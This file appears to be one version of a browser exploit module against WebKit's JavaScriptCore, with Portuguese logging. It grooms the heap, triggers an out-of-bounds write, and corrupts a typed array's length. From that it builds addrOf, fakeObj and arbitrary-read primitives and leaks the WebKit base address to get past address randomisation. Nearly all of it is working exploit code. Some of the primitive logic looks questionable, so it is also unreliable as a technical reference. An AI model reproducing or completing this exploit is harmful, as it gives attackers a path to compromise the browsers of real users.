// js/script3/testArrayBufferVictimCrash.mjs (v88_CorrectedSearch - R49 - Busca Corrigida e Primitivas Refinadas)

import { logS3, PAUSE_S3 } from './s3_utils.mjs';
import { AdvancedInt64, toHex, isAdvancedInt64Object } from '../utils.mjs';
import {
    triggerOOB_primitive,
    clearOOBEnvironment,
    oob_write_absolute,
    oob_read_absolute,
    isOOBReady
} from '../core_exploit.mjs';
import { JSC_OFFSETS, OOB_CONFIG } from '../config.mjs';

export const FNAME_MODULE_TYPEDARRAY_ADDROF_V88_CS_R49_WEBKIT = "Heisenbug_CorrectedSearch_v88_CS_R49_WebKitLeak";

// --- Globais para a primitiva de exploit ---
let addrOf_primitive = null;
let fakeObj_primitive = null;
let arb_read_v2 = null;
let arb_write_v2 = null;
// ---

let targetFunctionForLeak;

function isValidPointer(ptr) {
    if (!isAdvancedInt64Object(ptr)) return false;
    const high = ptr.high();
    const low = ptr.low();
    if (high === 0 && low === 0) return false;
    if (high === 0 && low < 0x10000) return false;
    return true;
}

const conversion_buffer = new ArrayBuffer(8);
const float_conversion_view = new Float64Array(conversion_buffer);
const int_conversion_view = new BigUint64Array(conversion_buffer);

function box(addr) {
    const val64 = (BigInt(addr.high()) << 32n) | BigInt(addr.low());
    int_conversion_view[0] = val64;
    return float_conversion_view[0];
}

function unbox(float_val) {
    float_conversion_view[0] = float_val;
    return new AdvancedInt64(int_conversion_view[0]);
}

export async function executeTypedArrayVictimAddrofAndWebKitLeak_R49() { // Nome atualizado para R49
    const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V88_CS_R49_WEBKIT;
    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Busca Corrigida e Primitivas Refinadas (R49) ---`, "test", FNAME_CURRENT_TEST_BASE);
    document.title = `${FNAME_CURRENT_TEST_BASE} Init R49...`;

    targetFunctionForLeak = function someUniqueLeakFunctionR49_Instance() { return `target_R49_${Date.now()}`; };
    logS3(`Função alvo para addrof (targetFunctionForLeak) recriada.`, "info");

    let iter_primary_error = null;
    let iter_addrof_result = { success: false, msg: "Addrof (R49): Not run." };
    let iter_webkit_leak_result = { success: false, msg: "WebKit Leak (R49): Not run." };

    try {
        logS3(`  --- Fase 1 (R49): Heap Grooming e Preparação da Vítima ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const GROOM_COUNT = 1000;
        let groom_array = new Array(GROOM_COUNT);
        for (let i = 0; i < GROOM_COUNT; i++) {
            groom_array[i] = new Float64Array(8);
        }
        logS3(`  Heap Grooming: ${GROOM_COUNT} arrays alocados.`, "info");
        
        const victim_array = groom_array[Math.floor(GROOM_COUNT / 2)];
        const marker = new AdvancedInt64(0xCAFEBABE, 0xDEADBEEF);
        victim_array.fill(box(marker));
        logS3(`  Array vítima (índice ${Math.floor(GROOM_COUNT / 2)}) preenchido com o marcador: ${marker.toString(true)}`, "info");
        groom_array = null;
        
        logS3(`  --- Fase 2 (R49): Ativação do OOB e Busca na Memória ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        await triggerOOB_primitive({ force_reinit: true });
        if (!isOOBReady()) throw new Error("Falha ao configurar o ambiente OOB.");

        let victim_data_offset = -1;
        
        // --- CORREÇÃO R49: Lógica de busca corrigida ---
        const search_start_offset = OOB_CONFIG.BASE_OFFSET_IN_DV;
        const search_end_offset = OOB_CONFIG.ALLOCATION_SIZE - 8; // Garante que não lemos 8 bytes além do buffer
        logS3(`  Iniciando busca pelo marcador na memória (range: ${toHex(search_start_offset)} a ${toHex(search_end_offset)})...`, "info");
        
        for (let current_offset = search_start_offset; current_offset < search_end_offset; current_offset += 4) {
            if(oob_read_absolute(current_offset, 4) === marker.low()){
                if(oob_read_absolute(current_offset + 4, 4) === marker.high()){
                    victim_data_offset = current_offset;
                    break;
                }
            }
        }
        
        if (victim_data_offset === -1) {
            throw new Error("Não foi possível encontrar o marcador do array vítima na memória (mesmo com busca ampla).");
        }
        logS3(`  SUCESSO: Marcador do buffer de dados do array vítima encontrado no offset: ${toHex(victim_data_offset)}`, "vuln");

        logS3(`  --- Fase 3 (R49): Corrupção Direta e Construção das Primitivas ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        const LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER = 32;
        const offset_of_view_header = victim_data_offset - LIKELY_OFFSET_FROM_DATA_TO_VIEW_HEADER;
        const offset_to_corrupt = offset_of_view_header + JSC_OFFSETS.ArrayBufferView.M_LENGTH_OFFSET;
        oob_write_absolute(offset_to_corrupt, 0xFFFFFFFF, 4);

        if (victim_array.length < 1000) {
            throw new Error(`A corrupção de 'length' falhou. Comprimento do victim_array é ${victim_array.length}.`);
        }
        logS3(`  SUCESSO: Comprimento do 'victim_array' corrompido para: ${victim_array.length}`, "vuln");

        // --- CORREÇÃO R49: Primitivas addrOf/fakeObj refinadas ---
        addrOf_primitive = (obj) => {
            victim_array[30] = obj; // Coloca o objeto em um índice conhecido do nosso array com 'length' gigante
            return unbox(victim_array[31]); // Lê o valor da posição adjacente, que deve conter o ponteiro "vazado"
        };
        fakeObj_primitive = (addr) => {
            victim_array[32] = box(addr); // Escreve o endereço como um float em uma posição
            return victim_array[33]; // Lê de volta a posição adjacente, que o motor interpretará como um objeto
        };
        logS3("  Primitivas 'addrOf' e 'fakeObj' refinadas definidas.", "info");

        let leaked_target_function_addr = addrOf_primitive(targetFunctionForLeak);
        logS3(`  [TESTE AddrOf] Endereço vazado de targetFunctionForLeak: ${leaked_target_function_addr.toString(true)}`, "leak");

        if (!isValidPointer(leaked_target_function_addr)) {
            throw new Error(`addrOf retornou um ponteiro inválido: ${leaked_target_function_addr.toString(true)}`);
        }
        iter_addrof_result = { success: true, msg: "addrOf obteve endereço com sucesso.", leaked_object_addr: leaked_target_function_addr.toString(true) };
        logS3("  [TESTE AddrOf] SUCESSO: Primitivas validadas.", "good");

        logS3(`  --- Fase 4 (R49): WebKit Base Leak ---`, "subtest", FNAME_CURRENT_TEST_BASE);
        arb_read_v2 = (addr) => {
            // A butterfly de um Float64Array aponta para si mesmo.
            // Para ler um endereço, criamos um objeto falso que é um ArrayBufferView,
            // e cujo ponteiro de dados (m_vector) aponta para o endereço desejado.
            // O JSObject header tem 16 bytes. O m_vector está em +16.
            // Portanto, o objeto falso precisa apontar para addr - 16.
            const fake_obj_addr = addr.sub(new AdvancedInt64(0, 16));
            let fake_array = fakeObj_primitive(fake_obj_addr);
            return unbox(fake_array[0]);
        };
        
        const ptr_to_executable_instance = arb_read_v2(leaked_target_function_addr.add(new AdvancedInt64(JSC_OFFSETS.JSFunction.EXECUTABLE_OFFSET)));
        logS3(`  WebKitLeak: Ponteiro para ExecutableInstance: ${ptr_to_executable_instance.toString(true)}`, 'leak');
        if(!isValidPointer(ptr_to_executable_instance)) throw new Error("Ponteiro para ExecutableInstance inválido.");

        const ptr_to_jit_or_vm = arb_read_v2(ptr_to_executable_instance.add(new AdvancedInt64(0, 8)));
        logS3(`  WebKitLeak: Ponteiro para JIT/VM: ${ptr_to_jit_or_vm.toString(true)}`, 'leak');
        if(!isValidPointer(ptr_to_jit_or_vm)) throw new Error("Ponteiro para JIT/VM inválido.");

        const page_mask_4kb = new AdvancedInt64(0x0, ~0xFFF);
        const webkit_base_candidate = ptr_to_jit_or_vm.and(page_mask_4kb);
        
        iter_webkit_leak_result = { success: true, msg: `Candidato a base do WebKit: ${webkit_base_candidate.toString(true)}`, webkit_base_candidate: webkit_base_candidate.toString(true) };
        logS3(`  WebKitLeak: SUCESSO! ${iter_webkit_leak_result.msg}`, "vuln");

    } catch (e) {
        iter_primary_error = e;
        logS3(`  ERRO na iteração R49: ${e.message}`, "critical", FNAME_CURRENT_TEST_BASE);
        console.error(`Erro na iteração R49:`, e);
    } finally {
        await clearOOBEnvironment();
    }

    let result = {
        errorOccurred: iter_primary_error ? (iter_primary_error.message || String(iter_primary_error)) : null,
        addrof_result: iter_addrof_result,
        webkit_leak_result: iter_webkit_leak_result,
    };
    
    logS3(`--- ${FNAME_CURRENT_TEST_BASE} Completed ---`, "test", FNAME_CURRENT_TEST_BASE);
    logS3(`Final result (R49): ${JSON.stringify(result, null, 2)}`, "debug", FNAME_CURRENT_TEST_BASE);
    
    return result;
}
